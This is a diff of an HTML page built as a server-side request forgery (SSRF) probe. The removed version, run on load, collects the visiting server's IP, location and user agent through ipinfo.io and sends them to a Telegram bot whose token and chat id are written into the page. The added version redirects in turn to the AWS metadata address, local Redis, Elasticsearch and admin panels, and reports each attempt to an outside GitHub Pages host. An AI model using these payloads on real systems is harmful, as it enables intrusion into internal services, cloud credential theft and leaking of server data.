@@ -1,52 +1,54 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-  <meta charset="UTF-8">
-  <title>SSRF Catcher</title>
-  <script>
-    async function getIPInfo() {
-      try {
-        const res = await fetch("https://ipinfo.io/json?token=be5998b85f541c");
-        return await res.json();
-      } catch (e) {
-        return {};
-      }
-    }
-
-    async function sendToTelegram(message) {
-      const token = "8182692132:AAGPJzf4tOZ7be5vrvd3RD3RJFZoEbmq1zg";
-      const chat_id = "6239813037";
-      const url = `https://api.telegram.org/bot${token}/sendMessage`;
-      await fetch(url, {
-        method: "POST",
-        headers: {"Content-Type": "application/json"},
-        body: JSON.stringify({chat_id, text: message, parse_mode: "Markdown"})
-      });
-    }
-
-    function formatMessage(data) {
-      return `📄 *[SSRF CATCHER]*
-🌟 *SSRF Confirmed!* Server followed localhost redirect.
-🌐 *IP:* ${data.ip || "Unknown"}
-📍 *City:* ${data.city || "Unknown"}
-🌎 *Country:* ${data.country || "Unknown"}
-🏢 *ISP:* ${data.org || "Unknown"}
-🧠 *User-Agent:* \`${navigator.userAgent}\`
-🕒 *Timestamp:* ${new Date().toISOString()}`;
-    }
-
-    async function run() {
-      const ipData = await getIPInfo();
-      const msg = formatMessage(ipData);
-      await sendToTelegram(msg);
-    }
-
-    window.onload = run;
-  </script>
+  <title>SSRF Redirect Chain</title>
+  <meta charset="utf-8">
 </head>
 <body>
-  <h1>SSRF Check Complete.</h1>
+  <h2>🌀 Testing SSRF Chain...</h2>
+  <script>
+    const targets = [
+      "http://169.254.169.254/latest/meta-data/",     // AWS metadata
+      "http://127.0.0.1:9200",                         // Elasticsearch
+      "http://127.0.0.1:6379",                         // Redis
+      "http://127.0.0.1/phpmyadmin",                  // phpMyAdmin
+      "http://127.0.0.1:8000/admin"                    // Local admin panel
+    ];
 
-  <iframe src="http://127.0.0.1:80" style="display:none;"></iframe>
+    let i = 0;
+
+    function tryNextTarget() {
+      if (i >= targets.length) {
+        location.href = "https://0xvendettaa.github.io/ssrf-check/catcher_ultimate.html?result=all_attempts_done";
+        return;
+      }
+
+      const target = targets[i];
+      const encodedTarget = encodeURIComponent(target);
+
+      // Log current attempt before redirecting
+      fetch("https://0xvendettaa.github.io/ssrf-check/catcher_ultimate.html?attempt=" + i + "&target=" + encodedTarget)
+        .then(() => {
+          // Delay before redirect to give time for logging
+          setTimeout(() => {
+            location.replace(target);
+          }, 2000);
+        })
+        .catch(() => {
+          // If fetch fails, still try redirect
+          setTimeout(() => {
+            location.replace(target);
+          }, 2000);
+        });
+
+      i++;
+    }
+
+    // Trigger the first attempt
+    tryNextTarget();
+
+    // Loop over targets every 6 seconds
+    setInterval(tryNextTarget, 6000);
+  </script>
 </body>
 </html>
